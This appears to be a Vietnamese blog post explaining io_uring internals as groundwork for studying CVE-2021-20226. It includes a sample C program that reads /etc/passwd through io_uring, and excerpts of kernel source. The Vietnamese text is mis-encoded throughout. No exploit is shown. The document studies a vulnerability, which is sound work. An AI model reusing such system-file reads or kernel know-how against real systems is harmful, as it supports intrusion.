ho√†n th√†nh tr√™n phi√™n b·∫£n io_uring. N·∫øu ƒë·∫°t ƒë∆∞·ª£c, m·ªôt eventfd file descriptor c√≥ th·ªÉ ƒë∆∞·ª£c ƒëƒÉng k√≠ th√¥ng qua system call n√†y. Th√¥ng tin ƒëƒÉng nh·∫≠p c·ªßa ·ª©ng d·ª•ng ƒëang ch·∫°y c√≥ th·ªÉ ƒë∆∞·ª£c ƒëƒÉng k√≠ v·ªõi io_uring, n√≥ s·∫Ω tr·∫£ v·ªÅ m·ªôt id li√™n k·∫øt v·ªõi c√°c th√¥ng tin ƒë√£ ƒëƒÉng nh·∫≠p ƒë√≥. C√°c ·ª©ng d·ª•ng mu·ªën chia s·∫ª v√≤ng k·∫øt n·ªëi gi·ªØa nh·ªØng ng∆∞·ªùi d√πng / quy tr√¨nh ri√™ng bi·ªát c√≥ th·ªÉ chuy·ªÉn v√†o id th√¥ng tin x√°c th·ª±c n√†y trong tr∆∞·ªùng t√≠nh c√°ch SQE. N·∫øu ƒë∆∞·ª£c ƒë·∫∑t, SQE c·ª• th·ªÉ ƒë√≥ s·∫Ω ƒë∆∞·ª£c c·∫•p v·ªõi c√°c th√¥ng tin x√°c th·ª±c n√†y.  io_uring_enter Kh·ªüi t·∫°o v√† ho√†n th√†nh I/O b·∫•t ƒë·ªìng b·ªô\n io_uring_enter() d√πng ƒë·ªÉ kh·ªüi t·∫°o v√† ho√†n th√†nh I/O\ts·ª≠ d·ª•ng h√†ng ƒë·ª£i submission v√† completion ƒë∆∞·ª£c thi·∫øt l·∫≠p b·ªüi io_uring_setup(). M·ªôt l·ªánh g·ªçi ƒë∆°n s·∫Ω bao g·ªìm g·ª≠i m·ªôt I/O m·ªõi v√† ƒë·ª£i ph·∫£n h·ªìi c·ªßa l·ªánh g·ªçi n√†y ho·∫∑c t·∫•t c·∫£ c√°c l·ªánh g·ªçi tr∆∞·ªõc ƒë√≥ ƒë·∫øn io_uring_enter().  1 2  int io_uring_enter(unsigned int fd, unsigned int to_submit, unsigned int min_complete,\runsigned int flags, sigset_t *sig);\r  Trong ƒë√≥:\n fd file descriptor ƒë∆∞·ª£c return b·ªüi io_uring_setup() to_submit ch·ªâ ƒë·ªãnh s·ªë l∆∞·ª£ng I/O ƒë·ªÉ submit t·ª´ submission queue. N·∫øu ƒë∆∞·ª£c ch·ªâ d·∫´n nh∆∞u v·∫≠y, h·ªá th·ªëng s·∫Ω ƒë·ª£i ho√†n th√†nh s·ª± ki·ªán min_complete tr∆∞·ªõc khi quay tr·ªü l·∫°i. N·∫øu th·ª±c th·ªÉ io_uring ƒë∆∞·ª£c c·∫•u h√¨nh ƒë·ªÉ thƒÉm d√≤, th√¨ min_complete s·∫Ω c√≥ √Ω nghƒ©a kh√°c m·ªôt ch√∫t. min_complete: nh∆∞ ·ªü tr√™n ƒë√£ n√≥i, ngo√†i ra, n·∫øu n√≥ b·∫±ng 0 √Ω n√≥i kernel s·∫Ω tr·∫£ v·ªÅ b·∫•t k√¨ s·ª± ki·ªán n√†o ƒë√£ ƒë∆∞·ª£c ho√†n th√†nh m√† kh√¥ng b·ªã ch·∫∑n. N·∫øu kh√°c 0, kernel ch·ªâ tr·∫£ v·ªÅ l·∫≠p t·ª©c s·ª± ki·ªán ƒëang ho√†n th√†nh. N·∫øu kh√¥ng c√≥ s·ª± ki·ªán ho√†n th√†nh n√†o kh·∫£ d·ª•ng, th√¨ cu·ªôc g·ªçi s·∫Ω thƒÉm d√≤ √Ω ki·∫øn ‚Äã‚Äãcho ƒë·∫øn khi c√≥ m·ªôt ho·∫∑c nhi·ªÅu s·ª± ki·ªán ho√†n th√†nh ho·∫∑c cho ƒë·∫øn khi qu√° tr√¨nh v∆∞·ª£t qu√° ph·∫ßn th·ªùi gian c·ªßa b·ªô l·∫≠p l·ªãch c·ªßa n√≥. L∆∞u √Ω r·∫±ng ƒë·ªëi v·ªõi I / O ƒë∆∞·ª£c ƒëi·ªÅu khi·ªÉn gi√°n ƒëo·∫°n, m·ªôt ·ª©ng d·ª•ng c√≥ th·ªÉ ki·ªÉm tra h√†ng ƒë·ª£i ho√†n th√†nh ƒë·ªÉ bi·∫øt s·ª± ki·ªán ho√†n th√†nh m√† kh√¥ng c·∫ßn nh·∫≠p h·∫°t nh√¢n. io_uring_enter() h·ªó tr·ª£ nhi·ªÅu ph√©p to√°n, bao g·ªìm:  Open, close, and stat files Read and write into multiple buffers or pre-mapped buffers Socket I/O operations Synchronize file state Gi√°m s√°t b·∫•t ƒë·ªìng b·ªô m·ªôt t·∫≠p file descriptors T·∫°o timeout li√™n k·∫øt t·ªõi ho·∫°t ƒë·ªông c·ª• th·ªÉ trong v√≤ng C·ªë g·∫Øng h·ªßy m·ªôt ho·∫°t ƒë·ªông hi·ªán ƒëang bay (th·ª±c hi·ªán) T·∫°o I/O chains  Th·ª±c hi·ªán theo th·ª© t·ª± trong m·ªôt chu·ªói Th·ª±c thi song song cho nhi·ªÅu chu·ªói      C∆° ch·∫ø ho·∫°t ƒë·ªông Asynchronous execution Kh√¥ng ph·∫£i l√∫c n√†o io_uring c≈©ng ch·∫°y b·∫•t ƒë·ªìng b·ªô m√† n√≥ ch·ªâ ch·∫°y khi n√≥ c·∫ßn. Nguy√™n nh√¢n l√† ƒë·ªÉ gi·∫£m thi·ªÉu t·ªëi ƒëa vi·ªác g·ªçi io_uring_enter() system call ƒë·ªÉ tƒÉng hi·ªáu su·∫•t c·ªßa ch∆∞∆°ng tr√¨nh.\nV√≠ d·ª• ·ªü ƒëo·∫°n code d∆∞·ªõi ƒë√¢y (Kernel 5.8)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76  #define _GNU_SOURCE\r#include \u0026lt;sched.h\u0026gt;\r#include \u0026lt;stdio.h\u0026gt;\r#include \u0026lt;string.h\u0026gt;\r#include \u0026lt;stdlib.h\u0026gt;\r#include \u0026lt;signal.h\u0026gt;\r#include \u0026lt;sys/syscall.h\u0026gt;\r#include \u0026lt;sys/fcntl.h\u0026gt;\r#include \u0026lt;err.h\u0026gt;\r#include \u0026lt;unistd.h\u0026gt;\r#include \u0026lt;sys/mman.h\u0026gt;\r#include \u0026lt;linux/io_uring.h\u0026gt;\r#define SYSCHK(x) ({ \\\r typeof(x) __res = (x); \\\rif (__res == (typeof(x))-1) \\\rerr(1, \u0026#34;SYSCHK(\u0026#34; #x \u0026#34;)\u0026#34;); \\\r__res; \\\r})\rstatic int uring_fd;\rstruct iovec *io;\r#define SIZE 32\r\rchar _buf[SIZE];\rint main(void) {\r// initialize uring\r struct io_uring_params params = { };\ruring_fd = SYSCHK(syscall(__NR_io_uring_setup, /*entries=*/10, \u0026amp;params));\runsigned char *sq_ring = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,\rMAP_SHARED, uring_fd,\rIORING_OFF_SQ_RING));\runsigned char *cq_ring = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,\rMAP_SHARED, uring_fd,\rIORING_OFF_CQ_RING));\rstruct io_uring_sqe *sqes = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,\rMAP_SHARED, uring_fd,\rIORING_OFF_SQES));\rio = malloc(sizeof(struct iovec)*1);\rio[0].iov_base = _buf;\rio[0].iov_len = SIZE;\rstruct timespec ts = { .tv_sec = 1 };\rsqes[0] = (struct io_uring_sqe) {\r.opcode = IORING_OP_TIMEOUT,\r//.flags = IOSQE_IO_HARDLINK,\r .len = 1,\r.addr = (unsigned long)\u0026amp;ts\r};\rsqes[1] = (struct io_uring_sqe) {\r.opcode = IORING_OP_READV,\r.addr = io,\r.flags = 0,\r.len = 1,\r.off = 0,\r.fd = SYSCHK(open(\u0026#34;/etc/passwd\u0026#34;, O_RDONLY))\r};\r((int*)(sq_ring + params.sq_off.array))[0] = 0;\r((int*)(sq_ring + params.sq_off.array))[1] = 1;\r(*(int*)(sq_ring + params.sq_off.tail)) += 2;\rint submitted = SYSCHK(syscall(__NR_io_uring_enter, uring_fd,\r/*to_submit=*/2, /*min_complete=*/0,\r/*flags=*/0, /*sig=*/NULL, /*sigsz=*/0));\rwhile(1){\rusleep(100000);\rif(*_buf){\rputs(\u0026#34;READV executed.\u0026#34;);\rbreak;\r}\rputs(\u0026#34;Waiting.\u0026#34;);\r}\r}\r  C√πng nh√¨n l·∫°i c∆° ch·∫ø l√†m vi·ªác c·ªßa io_uring\nFrom: https://flattsecurity.medium.com/cve-2021-20226-a-reference-counting-bug-which-leads-to-local-privilege-escalation-in-io-uring-e946bd69177a\n Ch√∫ng ta c√≥ m·ªôt c·∫•u tr√∫c iovec ·ªü line 21 ƒë·ªÉ ƒë·ªãnh nghƒ©a m·ªôt ph·∫ßn t·ª≠ vector  1 2 3 4  struct iovec{\rptr_t iov_base; /* Starting address */\rsize_t iov_len; /* Length in bytes */\r};\r  Th√¥ng th∆∞·ªùng c·∫•u tr√∫c n√†y ƒë∆∞·ª£c s·ª≠ d·ª•ng nh∆∞ m·ªôt m·∫£ng g·ªìm nhi·ªÅu ph·∫ßn t·ª≠. M·ªói l·∫ßn chuy·ªÉn ƒë·ªïi d·ªØ li·ªáu, con tr·ªè iov_base s·∫Ω tr·ªè v√†o v√πng ƒë·ªám ƒë·ªÉ nh·∫≠n d·ªØ li·ªáu (v·ªõi l·ªánh readv) ho·∫∑c chuy·ªÉn d·ªØ li·ªáu (v·ªõi l·ªánh writev). C√≤n ph·∫ßn t·ª≠ iov_len ƒë·ªãnh nghƒ©a ƒë·ªô d√†i t·ªëi ƒëa ƒë∆∞·ª£c nh·∫≠n v√† ƒë∆∞·ª£c vi·∫øt trong m·ªói l·∫ßn th·ª±c thi. ƒêo·∫°n code t·ª´ line 40-42 ƒë·ªÉ c·∫•p ph√°t c≈©ng nh∆∞ ƒë·ªãnh nghƒ©a gi√° tr·ªã c√°c ph·∫ßn t·ª≠ iov_base v√† iov_len.\n C·∫•u tr√∫c io_uring_params ·ªü line 29 d√πng ƒë·ªÉ chuy·ªÉn c√°c t√πy ch·ªçn ƒë·∫øn kernel v√† t·ª´ kernel truy·ªÅn th√¥ng tin v·ªÅ b·ªô ƒë·ªám v√≤ng (ring buffer)  1 2 3 4 5 6 7 8 9 10 11  struct io_uring_params {\r__u32 sq_entries;\r__u32 cq_entries;\r__u32 flags;\r__u32 sq_thread_cpu;\r__u32 sq_thread_idle;\r__u32 features;\r__u32 resv[4];\rstruct io_sqring_offsets sq_off;\rstruct io_cqring_offsets cq_off;\r};\r   Code t·ª´ line 29-39 d√πng ƒë·ªÉ t·∫°o 2 v√≤ng ƒë√™m buffer cho SQ v√† CQ c√πng v·ªõi 1 buffer SQEs ƒë·ªÉ l∆∞u c√°c Submission Entries. C·∫•u tr√∫c timespec ·ªü line 44d√πng ƒë·ªÉ ƒë·∫∑c t·∫£ th·ªùi gian ·ªü d·∫°ng seconds v√† nanoseconds:  1 2 3 4 5 6  #include \u0026lt;time.h\u0026gt;\r\rstruct timespec {\rtime_t tv_sec;\rlong tv_nsec;\r}\r  ·ªû ƒë√¢y, n√≥ ƒë∆∞·ª£c t·∫°o v·ªõi 1 sec.\n C·∫•u tr√∫c io_uring_sqe ·ªü line 37, 46, 52 di·ªÖn t·∫£ c·∫•u tr√∫c c·ªßa submission queue entry  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  struct io_uring_sqe {\r__u8 opcode; /* type of operation for this sqe */\r__u8 flags; /* IOSQE_ flags */\r__u16 ioprio; /* ioprio for the request */\r__s32 fd; /* file descriptor to do IO on */\r__u64 off; /* offset into file */\r__u64 addr; /* pointer to buffer or iovecs */\r__u32 len; /* buffer size or number of iovecs */\runion {\r__kernel_rwf_t rw_flags;\r__u32 fsync_flags;\r__u16 poll_events;\r__u32 sync_range_flags;\r__u32 msg_flags;\r};\r__u64 user_data; /* data to be passed back at completion time */\runion {\r__u16 buf_index; /* index into fixed buffers, if used */\r__u64 __pad2[3];\r};\r};\r  Trong ƒë√≥:\n opcode: ƒë·ªÉ ƒë·∫∑c t·∫£ ho·∫°t ƒë·ªông. V√≠ d·ª•: readv d√πng h·∫±ng s·ªë IORING_OP_READV fd: file descriptor c·ªßa file mu·ªën ƒë·ªçc addr: ƒë∆∞·ª£c d√πng ƒë·ªÉ tr·ªè ƒë·∫øn m·ªôt m·∫£ng c√°c iovec. len: gi·ªØ gi√° tr·ªã ƒë·ªô d√†i c·ªßa m·∫£ng c√°c iovec  Do ƒë√≥, ƒëo·∫°n code t·ª´ line 52-59 khai b√°o s·ª≠ d·ª•ng l·ªánh readv tr√™n file /etc/passwd. C√≤n t·ª´ line 44-51 c√≥ s·ª≠ d·ª•ng h·∫±ng s·ªë IORING_OP_TIMEOUT ƒë·ªÉ ch·ªâ ƒë·ªãnh r·∫±ng khi ·ª©ng d·ª•ng ƒëang sleep th√¨ ho·∫°t ƒë·ªông n√†y s·∫Ω ƒë∆∞·ª£c th·ª±c hi·ªán.\nC·∫£ ƒëo·∫°n code tr√™n, khi th·ª±c thi, c·ª© sau 0.1 seconds s·∫Ω ki·ªÉm tra xem li·ªáu readv() ƒë√£ th·ª±c thi xong hay ch∆∞a. V√† v√¨ ts ta thi·∫øt l·∫≠p n√≥ 1 seconds v√† truy·ªÅn v√†o sqes[0] n√™n readv() th·ª±c thi (sqes[1] th·ª±c thi) s·∫Ω sau 1 second. Tuy nhi√™n, khi th·ª±c thi, ta th·∫•y readv() l·∫°i th·ª±c thi ngay\n1 2 3 4  root@edisc:/home/test# ./sample READV executed\rroot@edisc:/home/test# ./sample READV executed\r  ƒêi·ªÅu n√†y ch·ª©ng t·ªè, h·ªá th·ªëng kh√¥ng ch·∫°y b·∫•t ƒë·ªìng b·ªô, hay n√≥i c√°ch kh√°c, n√≥ ch·ªâ ch·∫°y khi n√≥ c·∫ßn thi·∫øt, v√† tr∆∞·ªùng h·ª£p n√†y l√† kh√¥ng c·∫ßn thi·∫øt, ho·∫°t ƒë·ªông c·ªßa IORING_OP_TIMEOUT ƒë√£ b·ªã b·ªè qua.\nTa s·∫Ω ki·ªÉm tra trong tr∆∞·ªùng h·ª£p ch∆∞∆°ng tr√¨nh sample ch·∫°y b·∫•t ƒë·ªìng b·ªô b·∫±ng tool systemtap\nTheo t√°c gi·∫£ th√¨ khi th√™m flag IORING_OP_HARDLINK th√¨ ch∆∞∆°ng tr√¨nh sample.c s·∫Ω ti·∫øn h√†nh ki·∫øm tra sau 0.1s in ra d√≤ng ch·ªØ waiting v√† sau 1s l·ªánh READV s·∫Ω ƒë∆∞·ª£c th·ª±c thi, v√† s·∫Ω in ra READV executed. Tuy nhi√™n trong qu√° tr√¨nh ki·ªÉm tra tr√™n ubuntu 20.04, kernel 5.8.0-59-generic th√¨ l·∫°i nh·∫≠n ƒë∆∞·ª£c th√¥ng b√°o IORING_OP_HARDLINK ch∆∞a ƒë∆∞·ª£c khai b√°o. Trong khi IORING_OP_LINK v·∫´n b√¨nh th∆∞·ªùng.\nM·ªôt ch√∫t v·ªÅ IOSQE_IO_HARDLINK v√† IOSQE_IO_LINK ·ªû tr√™n ta c√≥ ƒë·ªÅ c·∫≠p t·ªõi 2 flag IOSQE_IO_HARDLINK v√† IOSQE_IO_LINK, ta s·∫Ω t√¨m hi·ªÉu n√≥ l√† g√¨.\n IOSQE_IO_LINK: c·ªù n√†y ƒë·ªÉ ch·ªâ ƒë·ªãnh c√°c SQE ƒë∆∞·ª£c ch·∫°y trong h√†ng ƒë·ª£i s·∫Ω ph·ª• thu·ªôc l·∫´n nhau, ph·∫ßn t·ª≠ sau ƒë·ª£i ph·∫ßn t·ª≠ ·ªü tr∆∞·ªõc, gi·ªëng nh∆∞ trong 1 gia ƒë√¨nh, √¥ng b·ªë ph·∫£i sinh ra r·ªìi th·∫±ng con m·ªõi ƒë∆∞·ª£c sinh, n·∫øu √¥ng b·ªë sinh th·∫•t b·∫°i th√¨ th·∫±ng con, ch√°u v√† c·∫£ d√≤ng h·ªç sau n√†y c≈©ng s·∫Ω ra ƒëi theo √¥ng b·ªë. ƒê·ªô d√†i c·ªßa chu·ªói s·∫Ω t√πy √Ω, t·ª± m·ªü r·ªông n·∫øu c√≥ th√™m SQE v√†o. IOSQE_IO_HARDLINK: gi·ªëng nh∆∞ link nh∆∞ng n√≥ m·∫°nh h∆°n. M·ªôt s·ªë l·ªánh b·ªã k·∫øt th√∫c do g·∫∑p ph·∫£i l·ªói, l√∫c n√†y k·∫øt qu·∫£ tr·∫£ v·ªÅ s·∫Ω \u0026lt; 0. V√≠ d·ª•, timeout s·∫Ω kh√¥ng c√≥ b·ªô ƒë·∫øm s·ªë l·∫ßn th·ª±c hi·ªán, n√≥ s·∫Ω lu√¥n ho√†n th√†nh v·ªõi -ETIME tr·ª´ khi n√≥ b·ªã h·ªßy. Do ƒë√≥, n·∫øu d√πng c·ªù IOSQE_IO_LINK khi 1 SQE tr·∫£ v·ªÅ gi√° tr·ªã nh·ªè h∆°n 0, n√≥ s·∫Ω c·∫Øt ƒë·ª©t to√†n b·ªô chu·ªói ph√≠a sau. Tr∆∞·ªùng h·ª£p ch√∫ng ta c√≥ d√πng l·ªánh v√† bi·∫øt ch·∫Øc n√≥ s·∫Ω x·∫£y ra l·ªói, khi ƒë√≥, IOSQE_IO_HARDLINK s·∫Ω l√†m li√™n k·∫øt m·∫°nh h∆°n m√† kh√¥ng b·ªã c·∫Øt ƒë·ª©t b·ªüi k·∫øt qu·∫£ tr·∫£ v·ªÅ ·ªü SQE tr∆∞·ªõc ƒë√≥. Ch√∫ √Ω r·∫±ng li√™n k·∫øt v·∫´n s·∫Ω b·ªã ng·∫Øt n·∫øu l·ªánh tr∆∞·ªõc ƒë√≥ kh√¥ng g·ª≠i v√† th·ª±c hi·ªán ƒë∆∞·ª£c, c√°c li√™n k·∫øt ch·ªâ ƒë∆∞·ª£c ph·ª•c h·ªìi khi y√™u c·∫ßu tr∆∞·ªõc ƒë√≥ nh·∫≠n ƒë∆∞·ª£c ph·∫£n h·ªìi.  Ta c√≥ th·ªÉ th·∫•y, nguy√™n l√≠ ho·∫°t ƒë·ªông c·ªßa vi·ªác quy·∫øt ƒë·ªãnh m·ªôt t√°c v·ª• c√≥ ch·∫°y ƒë∆∞·ª£c b·∫•t ƒë·ªìng b·ªô hay kh√¥ng nh∆∞ sau:\nTrong ·∫£nh tr√™n, ta th·∫•y m√† process b·ªã ch·∫∑n l·∫°i th√¨ n√≥ s·∫Ω chuy·ªÉn ƒë·∫øn IORING_OP_TIMEOUT v√† t·ª´ ƒë√¢y n√≥ s·∫Ω ƒë∆∞·ª£c chuy·ªÉn sang kernel thread. Nh∆∞ ƒë√£ ƒë·ªÅ c·∫≠p tr∆∞·ªõc ƒë√≥, API n√†y n√≥ ch·ªâ ch·∫°y b·∫•t ƒë·ªìng b·ªô khi c·∫ßn nghƒ©a l√† s·∫Ω c√≥ m·ªôt s·ªë ƒëi·ªÅu ki·ªán n√†o ƒë√≥ ƒë·ªÉ n√≥ ch·∫°y b·∫•t ƒë·ªìng b·ªô. V√≠ d·ª• m·ªôt s·ªë tr∆∞·ªùng h·ª£p sau.\n Khi b·∫≠t c·ªù y√™u c·∫ßu bu·ªôc ph·∫£i ch·∫°y b·∫•t ƒë·ªìng b·ªô REQ_F_FORCE_ASYNC  1 2 3 4 5 6 7 8 9  } else if (req-\u0026gt;flags \u0026amp; REQ_F_FORCE_ASYNC) {\r......\r/*\r* Never try inline submit of IOSQE_ASYNC is set, go straight\r* to async execution.\r*/\rreq-\u0026gt;work.flags |= IO_WQ_WORK_CONCURRENT;\rio_queue_async_work(req); }\r  code here\nDo logic c·ªßa t·ª´ng ho·∫°t ƒë·ªông ri√™ng, v√≠ d·ª• nh∆∞ th√™m flag IOCB_NOWAIT khi g·ªçi readv() v√† tr·∫£ v·ªÅ EAGAIN khi mu·ªën d·ª´ng.  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  static int io_read(struct io_kiocb *req, struct io_kiocb **nxt,\rbool force_nonblock)\r{\r......\rret = rw_verify_area(READ, req-\u0026gt;file, \u0026amp;kiocb-\u0026gt;ki_pos, iov_count);\rif (!ret) {\rssize_t ret2;\rif (req-\u0026gt;file-\u0026gt;f_op-\u0026gt;read_iter)\rret2 = call_read_iter(req-\u0026gt;file, kiocb, \u0026amp;iter);\relse\rret2 = loop_rw_iter(READ, req-\u0026gt;file, kiocb, \u0026amp;iter);\r/* Catch -EAGAIN return for forced non-blocking submission */\rif (!force_nonblock || ret2 != -EAGAIN) {\rkiocb_done(kiocb, ret2, nxt, req-\u0026gt;in_async);\r} else {\rcopy_iov:\rret = io_setup_async_rw(req, io_size, iovec,\rinline_vecs, \u0026amp;iter);\rif (ret)\rgoto out_free;\rreturn -EAGAIN;\r}\r}\r......\r}\r  code here\n·ªû ƒë√¢y c√≥ c·∫•u tr√∫c io_kiocb ph·ª•c v·ª• cho vi·ªác ƒë·ªçc file\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  /*\r* NOTE! Each of the iocb union members has the file pointer\r* as the first entry in their struct definition. So you can\r* access the file pointer through any of the sub-structs,\r* or directly as just \u0026#39;ki_filp\u0026#39; in this struct.\r*/\rstruct io_kiocb {\runion {\rstruct file\t*file;\rstruct io_rw\trw;\rstruct io_poll_iocb\tpoll;\rstruct io_poll_update\tpoll_update;\rstruct io_accept\taccept;\rstruct io_sync\tsync;\rstruct io_cancel\tcancel;\rstruct io_timeout\ttimeout;\rstruct io_timeout_rem\ttimeout_rem;\rstruct io_connect\tconnect;\rstruct io_sr_msg\tsr_msg;\rstruct io_open\topen;\rstruct io_close\tclose;\rstruct io_rsrc_update\trsrc_update;\rstruct io_fadvise\tfadvise;\rstruct io_madvise\tmadvise;\rstruct io_epoll\tepoll;\rstruct io_splice\tsplice;\rstruct io_provide_buf\tpbuf;\rstruct io_statx\tstatx;\rstruct io_shutdown\tshutdown;\rstruct io_rename\trename;\rstruct io_unlink\tunlink;\r/* use only after cleaning per-op data, see io_clean_op() */\rstruct io_completion\tcompl;\r};\r  Khi gi√° tr·ªã EAGAIN ƒë∆∞·ª£c tr·∫£ v·ªÅ, process s·∫Ω ƒë∆∞·ª£c ƒë∆∞a v√†o h√†ng ƒë·ª£i ƒë·ªÉ ch·∫°y b·∫•t ƒë·ªìng b·ªô line 9-23:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  static void __io_queue_sqe(struct io_kiocb *req, const struct io_uring_sqe *sqe)\r{\r......\rret = io_issue_sqe(req, sqe, \u0026amp;nxt, true);\r/*\r* We async punt it if the file wasn\u0026#39;t marked NOWAIT, or if the file\r* doesn\u0026#39;t support non-blocking read/write attempts\r*/\rif (ret == -EAGAIN \u0026amp;\u0026amp; (!(req-\u0026gt;flags \u0026amp; REQ_F_NOWAIT) ||\r(req-\u0026gt;flags \u0026amp; REQ_F_MUST_PUNT))) {\rpunt:\rif (io_op_defs[req-\u0026gt;opcode].file_table) {\rret = io_grab_files(req);\rif (ret)\rgoto err;\r}\r/*\r* Queued up for async execution, worker will release\r* submit reference when the iocb is actually submitted.\r*/\rio_queue_async_work(req);\rgoto done_req;\r}\r......\r}   Khi c·ªù IOSQE_IO_LINK | IOSQE_IO_HARDLINK ƒë∆∞·ª£c s·ª≠ d·ª•ng, th·ª© t·ª± th·ª±c thi s·∫Ω ƒë∆∞·ª£c ch·ªâ ƒë·ªãnh, ho·∫°t ƒë·ªông ƒëang th·ª±c hi·ªán tr∆∞·ªõc ƒë√≥ s·∫Ω ƒë∆∞·ª£c y√™u c·∫ßu chuy·ªÉn sang b·∫•t ƒë·ªìng b·ªô.  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  static bool io_submit_sqe(struct io_kiocb *req, const struct io_uring_sqe *sqe,\rstruct io_submit_state *state, struct io_kiocb **link)\r{\r......\r/*\r* If we already have a head request, queue this one for async\r* submittal once the head completes. If we don\u0026#39;t have a head but\r* IOSQE_IO_LINK is set in the sqe, start a new head. This one will be\r* submitted sync once the chain is complete. If none of those\r* conditions are true (normal request), then just queue it.\r*/\rif (*link) {\r......\rlist_add_tail(\u0026amp;req-\u0026gt;link_list, \u0026amp;head-\u0026gt;link_list);\r/* last request of a link, enqueue the link */\rif (!(sqe_flags \u0026amp; (IOSQE_IO_LINK|IOSQE_IO_HARDLINK))) {\rio_queue_link_head(head);\r*link = NULL;\r}\r} else {\r......\rif (sqe_flags \u0026amp; (IOSQE_IO_LINK|IOSQE_IO_HARDLINK)) {\rreq-\u0026gt;flags |= REQ_F_LINK;\rINIT_LIST_HEAD(\u0026amp;req-\u0026gt;link_list);\rif (io_alloc_async_ctx(req)) {\rret = -EAGAIN;\rgoto err_req;\r}\rret = io_req_defer_prep(req, sqe);\rif (ret)\rreq-\u0026gt;flags |= REQ_F_FAIL_LINK;\r*link = req;\r} else {\rio_queue_sqe(req, sqe);\r}\r}\rreturn true;\r}   line 12-19 l√† tr∆∞·ªùng h·ª£p ƒë√£ t·ªìn t·∫°i head request, trong ƒë√≥: line 12-14 ƒë∆∞a sqe v√†o ƒëu√¥i c·ªßa list. line 16-19 l√† tr∆∞·ªùng h·ª£p kh√¥ng c·ªù IOSQE_IO_LINK|IOSQE_IO_HARDLINK kh√¥ng ƒë∆∞·ª£c b·∫≠t\nN·∫øu kh√¥ng t·ªìn t·∫°i head request m√† c·ªù IOSQE_IO_LINK|IOSQE_IO_HARDLINK b·∫≠t, th√¨ h·ªá th·ªëng s·∫Ω t·∫°o m·ªôt head m·ªõi (line 24), v√† chuy·ªÉn sang b·∫•t ƒë·ªìng b·ªô(line 25)\n N√≥i m·ªôt c√°ch ch√≠nh x√°c, v·ªõi IORING_OP_TIMEOUT c√≥ m·ªôt ch√∫t ƒë·∫∑c bi·ªát, ƒë√≥ l√† n√≥ kh√¥ng tr·∫£ v·ªÅ EAGAIN nh∆∞ nh·ªØng minh h·ªça tr√™n, tuy nhi√™n t√°c gi·∫£ nghƒ© ƒë√¢y l√† m·ªôt v√≠ d·ª• d·ªÖ ƒë·ªÉ hi·ªÉu n√™n √¥ng ta ƒë√£ quy·∫øt ƒë·ªãnh d√πng n√≥ ƒë·ªÉ gi·∫£i th√≠ch, minh h·ªça trong blog c·ªßa m√¨nh.\nKhi thay th√™m .flags = IOSQE_IO_HARDLINK th√¨ IORING_OP_TIMEOUT s·∫Ω ƒë∆∞·ª£c th·ª±c thi b·ªüi 1 thread kh√°c, c√≤n IORING_OP_READV s·∫Ω ƒë∆∞·ª£c th·ª±c thi sau 1s. Tuy nhi√™n, t·∫°i th·ªùi ƒëi·ªÉm t√¥i th·ª±c hi·ªán tr√™n linux kernel 5.8.0-59-generic, th√¨ l·∫°i kh√¥ng t·ªìn t·∫°i flag IOSQE_IO_HARDLINK, T√¥i v·∫´n kh√¥ng bi·∫øt l√≠ do tr√™n l√† do io_uring ƒë√£ b·ªè n√≥ ƒëi ƒë·ªÉ fix l·ªói, hay do trong qu√° tr√¨nh c√†i ƒë·∫∑t t√¥i ƒë√£ b·ªã thi·∫øu g√¨ ƒë√≥. V√† m·ªôt ƒëi·ªÅu n·ªØa, t√°c gi·∫£ s·ª≠ d·ª•ng systemstap ƒë·ªÉ debug r·∫•t m∆∞·ª£t, c√≤n t√¥i, trong qu√° tr√¨nh follow theo th√¨ l·∫°i t·ªën kh√° nhi·ªÅu th·ªùi gian cho script n√†y v√† ƒë·∫øn b√¢y gi·ªù v·∫´n th·∫•t b·∫°i.\nR√µ r√†ng tr√™n h·ªá th·ªëng ch·ªâ c√≥ IOSQE_IO_LINK, nh∆∞ng khi b·∫≠t flag n√†y, nh∆∞ ƒë√£ n√≥i ·ªü tr∆∞·ªõc ƒë√≥, k·∫øt qu·∫£ ƒë·∫°t ƒë∆∞·ª£c l√† kh√¥ng nh∆∞ mong mu·ªën v√¨ sqe[0] ch∆∞a ho√†n th√†nh n√™n sqe[1] (IORING_OP_READV) s·∫Ω kh√¥ng th·ª±c thi.\nM·∫∑c d√π n√≥ kh√¥ng ƒë∆∞a ra k·∫øt qu·∫£ nh∆∞ mong mu·ªën (c·∫ßn d√πng IOSQE_IO_HARDLINK) nh∆∞ng khi d√πng IOSQE_IO_LINK t·ª´ ph√≠a kernel nh√¨n xu·ªëng ta v·∫´n th·∫•y IORING_OP_READV v√† IORING_OP_TIMEOUT v·∫´n ƒë∆∞·ª£c x·ª≠ l√≠ nh∆∞ 2 th·∫±ng, v√† IORING_OP_TIMEOUT ƒë∆∞·ª£c xem nh∆∞ worker.\nK·∫øt qu·∫£ tr√™n minh h·ªça cho ƒëo·∫°n code ƒë·ªÉ t·∫°o worker t·ª´ kernel nh∆∞ sau:  1 2 3 4 5 6 7  static bool create_io_worker(struct io_wq *wq, struct io_wqe *wqe, int index)\r{\r......\rworker-\u0026gt;task = kthread_create_on_node(io_wqe_worker, worker, wqe-\u0026gt;node,\r\u0026#34;io_wqe_worker-%d/%d\u0026#34;, index, wqe-\u0026gt;node);\r......\r}   Khi io_timeout() ƒë∆∞·ª£c g·ªçi, n√≥ s·∫Ω ƒë·∫∑t io_timeout_fn() trong handler v√† b·∫Øt ƒë·∫ßu b·ªô ƒë·∫øm th·ªùi gian. Sau khi h·∫øt th·ªùi gian cho ph√©p (timeout) 